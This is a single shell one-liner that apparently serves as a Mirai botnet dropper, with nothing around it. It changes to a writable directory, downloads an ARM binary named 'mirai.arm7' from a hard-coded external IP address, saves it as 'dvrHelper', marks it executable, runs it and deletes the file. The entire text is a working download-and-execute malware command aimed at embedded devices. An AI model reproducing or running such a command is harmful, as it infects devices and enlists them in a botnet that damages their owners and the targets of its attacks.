cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://120.92.90.235/ghf/mirai.arm7 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
